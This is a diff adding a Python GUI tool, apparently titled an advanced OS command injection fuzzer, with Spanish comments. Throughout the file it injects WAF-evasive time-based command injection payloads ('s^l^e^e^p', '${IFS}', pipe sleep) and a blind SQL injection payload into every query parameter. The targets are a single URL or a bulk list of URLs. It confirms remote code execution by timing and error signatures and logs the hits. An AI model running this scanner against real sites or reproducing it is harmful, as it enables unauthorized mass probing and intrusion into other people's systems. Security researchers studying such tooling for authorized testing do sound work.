@@ -1,0 +1,317 @@
+import os
+import sys
+import time
+import threading
+import requests
+from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
+
+# Librerías para la interfaz gráfica
+import tkinter as tk
+from tkinter import filedialog, messagebox, ttk
+from tkinter.scrolledtext import ScrolledText
+
+# Desactivar advertencias de SSL inseguro (muy común en entornos viejos o staging)
+requests.packages.urllib3.disable_warnings()
+
+# Diccionario de Payloads optimizados para evadir WAFs y filtros comunes
+PAYLOADS_DISPONIBLES = {
+    "Windows/IIS (Evasión de caracteres: s^l^e^e^p)": "127.0.0.1%26s^l^e^e^p^+{}",
+    "Linux/Unix General (Usa $IFS para espacios)": "127.0.0.1%26%26sleep${IFS}{}",
+    "URL-Encoded Limpio (Espacios como %20)": "127.0.0.1%20%26%26%20sleep%20{}",
+    "Operador de Tubería (Pipe | sleep)": "127.0.0.1%7Csleep+{}",
+    "Sql blind": "0'XOR(if(now()=sysdate(),sleep(10),0))XOR'X"
+}
+
+# Extensiones estáticas que se descartan automáticamente para no perder tiempo
+EXTENSIONES_BASURA = {
+    '.jpg', '.jpeg', '.png', '.gif', '.svg', '.ico', '.webp',
+    '.css', '.scss', '.less', '.woff', '.woff2', '.ttf', '.eot',
+    '.mp4', '.mp3', '.webm', '.avi', '.mov', '.pdf', '.doc',
+    '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.zip', '.tar',
+    '.gz', '.rar', '.7z', '.txt', '.md', '.json', '.xml', '.js'
+}
+
+# Firmas de error que delatan funciones como system(), exec(), popen(), child_process, etc.
+ERRORES_CONSOLA = [
+    "command not found", "is not recognized as an internal or external command",
+    "file name too long", "syntax error near unexpected token",
+    "Warning: exec()", "Warning: shell_exec()", "child_process.exec",
+    "Permission denied (os error", "cannot find the path specified",
+    "fatal: Windows execution failed", "built-in shell operator error"
+]
+
+class FuzzerApp:
+    def __init__(self, root):
+        self.root = root
+        self.root.title("Advanced OS Command Injection Fuzzer - @Jarvis")
+        self.root.geometry("950x750")
+        self.root.configure(bg="#1e1e1e")
+
+        self.archivo_seleccionado = ""
+        self.escaneando = False
+
+        # --- ESTILOS ---
+        style = ttk.Style()
+        style.theme_use("clam")
+        style.configure("TLabel", background="#1e1e1e", foreground="#ffffff", font=("Helvetica", 10))
+        style.configure("TButton", background="#333333", foreground="#ffffff", font=("Helvetica", 10, "bold"))
+        style.configure("TCheckbutton", background="#1e1e1e", foreground="#ffffff", font=("Helvetica", 10))
+        style.map("TButton", background=[("active", "#444444")])
+
+        # --- COMPONENTES ---
+
+        # MODO 1: Escaneo por Archivo Masivo (.txt limpio con tu grep)
+        self.frame_file = tk.LabelFrame(root, text=" Modo 1: Escaneo Masivo (.txt) ", bg="#1e1e1e", fg="#00ff00", font=("Helvetica", 10, "bold"), pady=10)
+        self.frame_file.pack(fill="x", padx=15, pady=5)
+
+        self.lbl_file = ttk.Label(self.frame_file, text="Archivo de Objetivos:")
+        self.lbl_file.pack(side="left", padx=5)
+
+        self.btn_buscar = ttk.Button(self.frame_file, text="Seleccionar TXT", command=self.seleccionar_archivo)
+        self.btn_buscar.pack(side="left", padx=5)
+
+        self.lbl_ruta = ttk.Label(self.frame_file, text="Ningún archivo seleccionado...", font=("Helvetica", 9, "italic"), foreground="#aaaaaa")
+        self.lbl_ruta.pack(side="left", padx=10)
+
+        # MODO 2: Analizar una Sola URL (Para laboratorios o endpoints específicos de Burp)
+        self.frame_single = tk.LabelFrame(root, text=" Modo 2: Analizar una Sola URL ", bg="#1e1e1e", fg="#00ff00", font=("Helvetica", 10, "bold"), pady=10)
+        self.frame_single.pack(fill="x", padx=15, pady=5)
+
+        self.lbl_single = ttk.Label(self.frame_single, text="Pegar URL objetivo:")
+        self.lbl_single.pack(side="left", padx=5)
+
+        self.entry_url = tk.Entry(self.frame_single, bg="#121212", fg="#ffffff", insertbackground="white", font=("Consolas", 10))
+        self.entry_url.pack(side="left", padx=5, fill="x", expand=True)
+
+        self.btn_single = ttk.Button(self.frame_single, text="Testear URL Única", command=self.iniciar_test_unico)
+        self.btn_single.pack(side="left", padx=5)
+
+        # CONFIGURACIÓN DEL ATAQUE
+        self.frame_payload = tk.Frame(root, bg="#1e1e1e", pady=10)
+        self.frame_payload.pack(fill="x", padx=15)
+
+        self.lbl_pay = ttk.Label(self.frame_payload, text="Payload a Utilizar:")
+        self.lbl_pay.pack(side="left", padx=5)
+
+        self.combo_payload = ttk.Combobox(self.frame_payload, values=list(PAYLOADS_DISPONIBLES.keys()), width=45, state="readonly")
+        self.combo_payload.pack(side="left", padx=5)
+        self.combo_payload.current(0)
+
+        # Checkbox para disparar la ráfaga completa de payloads secuenciales
+        self.var_todos_payloads = tk.BooleanVar()
+        self.chk_todos = ttk.Checkbutton(self.frame_payload, text="¿Probar TODOS los payloads en ráfaga?", variable=self.var_todos_payloads)
+        self.chk_todos.pack(side="left", padx=15)
+
+        # Botón de Control Principal para el Modo Masivo
+        self.btn_control = tk.Button(root, text="INICIAR ESCANEO MASIVO", bg="#28a745", fg="white", font=("Helvetica", 11, "bold"), pady=8, command=self.controlar_escaneo)
+        self.btn_control.pack(fill="x", padx=20, pady=5)
+
+        # Consola de Salida de Texto Profesional
+        self.lbl_console = ttk.Label(root, text="Consola de Salida (Monitoreo de Comportamiento Backend):")
+        self.lbl_console.pack(anchor="w", padx=20, pady=2)
+
+        self.txt_consola = ScrolledText(root, bg="#121212", fg="#00ff00", insertbackground="white", font=("Consolas", 10))
+        self.txt_consola.pack(fill="both", expand=True, padx=20, pady=5)
+
+        # Configuración de Capas de Color para la Consola
+        self.txt_consola.tag_config("normal", foreground="#00ff00")
+        self.txt_consola.tag_config("anomalia", foreground="#ffc107", font=("Consolas", 10, "bold"))
+        self.txt_consola.tag_config("critico", background="#dc3545", foreground="#ffffff", font=("Consolas", 11, "bold"))
+        self.txt_consola.tag_config("info", foreground="#ffffff")
+
+        self.log("info", "[*] Framework cargado. Listo para auditorías de Caja Negra Inteligente.\n")
+
+    def seleccionar_archivo(self):
+        file_path = filedialog.askopenfilename(filetypes=[("Archivos de Texto", "*.txt"), ("Todos los archivos", "*.*")])
+        if file_path:
+            self.archivo_seleccionado = file_path
+            self.lbl_ruta.config(text=f"Cargado: {os.path.basename(file_path)}", foreground="#00ff00")
+            self.log("info", f"[+] Base de datos masiva vinculada: {file_path}\n")
+
+    def log(self, tag, mensaje):
+        self.txt_consola.insert(tk.END, mensaje, tag)
+        self.txt_consola.see(tk.END)
+
+    def controlar_escaneo(self):
+        if self.escaneando:
+            self.escaneando = False
+            self.btn_control.config(text="INICIAR ESCANEO MASIVO", bg="#28a745")
+            self.log("anomalia", "\n[!] Escaneo en lote pausado por el operador.\n")
+        else:
+            if not self.archivo_seleccionado:
+                messagebox.showwarning("Atención", "Bro, primero debes cargar el archivo .txt con las URLs a escanear.")
+                return
+
+            self.escaneando = True
+            self.btn_control.config(text="DETENER ESCANEO", bg="#dc3545")
+            self.txt_consola.delete('1.0', tk.END)
+            self.log("info", "[*] Iniciando motor de escaneo en bloque...\n")
+
+            threading.Thread(target=self.proceso_fuzzing, daemon=True).start()
+
+    def iniciar_test_unico(self):
+        url_single = self.entry_url.get().strip()
+        if not url_single:
+            messagebox.showwarning("Atención", "Inserta una URL con parámetros en el Modo 2, bro.")
+            return
+
+        self.txt_consola.delete('1.0', tk.END)
+        self.log("info", f"[+] Solicitando análisis inmediato de objetivo aislado...\n")
+
+        # Desviar la ejecución a un hilo para evitar que la UI se clave mientras espera el timeout
+        threading.Thread(target=self.proceso_url_unica, args=(url_single,), daemon=True).start()
+
+    def construir_url_inyectada(self, url_parsed, parametros, parametro_a_atacar, valor_payload):
+        nuevos_params = parametros.copy()
+        nuevos_params[parametro_a_atacar] = [valor_payload]
+        query_string = urlencode(nuevos_params, doseq=True)
+        return urlunparse((url_parsed.scheme, url_parsed.netloc, url_parsed.path, url_parsed.params, query_string, url_parsed.fragment))
+
+    def escanear_parametro(self, url_parsed, params, param, url_limpia):
+        headers = {"User-Agent": USER_AGENT, "X-Forwarded-For": "127.0.0.1"}
+
+        # Filtro de ráfaga o selección única
+        payloads_a_probar = PAYLOADS_DISPONIBLES if self.var_todos_payloads.get() else {self.combo_payload.get(): PAYLOADS_DISPONIBLES[self.combo_payload.get()]}
+
+        for nombre_p, molde in payloads_a_probar.items():
+            # TEST 1: Sleep 10 segundos
+            payload_10 = molde.format(10)
+            url_test_10 = self.construir_url_inyectada(url_parsed, params, param, payload_10)
+
+            start_time = time.time()
+            try:
+                r = requests.get(url_test_10, headers=headers, timeout=14, verify=False)
+                texto_respuesta = r.text
+            except requests.exceptions.RequestException:
+                texto_respuesta = ""
+
+            tiempo_10 = time.time() - start_time
+
+            # ESTRATEGIA A: Búsqueda activa de errores de consola expuestos en el código fuente HTML
+            for error in ERRORES_CONSOLA:
+                if error.lower() in texto_respuesta.lower():
+                    resultado_error = (
+                        f"\n" + "="*70 + "\n"
+                        f"💥 [ERROR DE BACKEND EXPUESTO - POSIBLE RCE] 💥\n"
+                        f"Target: {url_limpia}\n"
+                        f"Campo Afectado: {param}\n"
+                        f"Firma Encontrada: '{error}' (Denota función de sistema desprotegida)\n"
+                        f"Evidencia Técnica: {url_test_10}\n"
+                        + "="*70 + "\n\n"
+                    )
+                    self.log("critico", resultado_error)
+                    with open("rce_errores_detectados.txt", "a") as f:
+                        f.write(resultado_error)
+                    return # Si el código ya escupió un error de consola, rompemos este parámetro y lo guardamos
+
+            # ESTRATEGIA B: Análisis del comportamiento temporal (Si el WAF/aplicación es ciego)
+            if tiempo_10 >= 9.5:
+                self.log("anomalia", f"    [⚠️] Anomalía detectada ({tiempo_10:.2f}s) en '{param}' usando [{nombre_p}]. Lanzando contraprueba...\n")
+
+                # TEST 2: Contraprueba de control (Sleep 5 segundos)
+                payload_5 = molde.format(5)
+                url_test_5 = self.construir_url_inyectada(url_parsed, params, param, payload_5)
+
+                start_time_5 = time.time()
+                try:
+                    requests.get(url_test_5, headers=headers, timeout=9, verify=False)
+                except requests.exceptions.RequestException:
+                    pass
+                tiempo_5 = time.time() - start_time_5
+
+                # Validación estricta de proporcionalidad matemática de la brecha
+                if (4.5 <= tiempo_5 <= 7.5) and (tiempo_10 > tiempo_5 + 3.0):
+                    resultado_rce = (
+                        f"\n" + "="*70 + "\n"
+                        f"🔥 [CRITICAL RCE CONFIRMADO POR COMPORTAMIENTO DINÁMICO] 🔥\n"
+                        f"Target: {url_limpia}\n"
+                        f"Parámetro Vulnerable: {param}\n"
+                        f"Bypass Utilizado: {nombre_p}\n"
+                        f"URL Inyección Master: {url_test_10}\n"
+                        f"Tiempos Medidos -> Sleep 10: {tiempo_10:.2f}s | Sleep 5: {tiempo_5:.2f}s\n"
+                        + "="*70 + "\n\n"
+                    )
+                    self.log("critico", resultado_rce)
+                    with open("rce_confirmados_gui.txt", "a") as f:
+                        f.write(resultado_rce)
+                else:
+                    self.log("normal", f"    [-] Falso Positivo: '{param}' con [{nombre_p}] descartado (Test 5s tomó {tiempo_5:.2f}s -> Timeout rígido/estático)\n")
+
+    def proceso_url_unica(self, url):
+        try:
+            url_parsed = urlparse(url)
+            params = parse_qs(url_parsed.query)
+            if not params:
+                self.log("anomalia", "[!] Error: La URL ingresada no contiene variables query string (?id=, ?file=, etc.) para inyectar.\n")
+                return
+
+            url_limpia = f"{url_parsed.scheme}://{url_parsed.netloc}{url_parsed.path}"
+            self.log("info", f"[*] Ejecutando escaneo dedicado: {url_limpia} ({len(params)} parámetros)\n")
+
+            for param in params.keys():
+                self.log("info", f"[*] Fuzzeando parámetro aislado: '{param}'\n")
+                self.escanear_parametro(url_parsed, params, param, url_limpia)
+
+            self.log("info", "\n[+] Análisis de objetivo único finalizado.\n")
+        except Exception as e:
+            self.log("anomalia", f"[!] Error crítico en parseo: {str(e)}\n")
+
+    def proceso_fuzzing(self):
+        analizadas = 0
+        descartadas_ext = 0
+        descartadas_sin_param = 0
+
+        try:
+            with open(self.archivo_seleccionado, "r", encoding="utf-8", errors="ignore") as f:
+                for line in f:
+                    if not self.escaneando:
+                        break
+
+                    url = line.strip()
+                    if not url:
+                        continue
+
+                    try:
+                        url_parsed = urlparse(url)
+
+                        # Exclusión agresiva de extensiones estáticas
+                        ruta_limpia = url_parsed.path.lower()
+                        _, ext = os.path.splitext(ruta_limpia)
+                        if ext in EXTENSIONES_BASURA:
+                            descartadas_ext += 1
+                            continue
+
+                        # Exclusión de URLs sin parámetros atacables
+                        params = parse_qs(url_parsed.query)
+                        if not params:
+                            descartadas_sin_param += 1
+                            continue
+
+                        url_limpia = f"{url_parsed.scheme}://{url_parsed.netloc}{url_parsed.path}"
+                        self.log("normal", f"[*] Analizando: {url_limpia} (Campos: {list(params.keys())})\n")
+
+                        for param in params.keys():
+                            if not self.escaneando: break
+                            self.escanear_parametro(url_parsed, params, param, url_limpia)
+
+                        analizadas += 1
+
+                        if analizadas % 500 == 0:
+                            self.log("anomalia", f"\n[>] NOTIFICACIÓN: {analizadas} URLs procesadas con éxito.\n\n")
+
+                    except Exception:
+                        pass
+
+        except Exception as e:
+            self.log("anomalia", f"\n[!] Fallo en lectura de lote: {str(e)}\n")
+
+        self.escaneando = False
+        self.btn_control.config(text="INICIAR ESCANEO MASIVO", bg="#28a745")
+        self.log("info", f"\n[+] ESCANEO COMPLETADO.\n[+] Endpoints con parámetros testeados: {analizadas}\n")
+        messagebox.showinfo("Proceso Concluido", f"Auditoría masiva terminada.\nURLs reales fuzzeadas: {analizadas}")
+
+if __name__ == "__main__":
+    USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+    root = tk.Tk()
+    app = FuzzerApp(root)
+    root.mainloop()
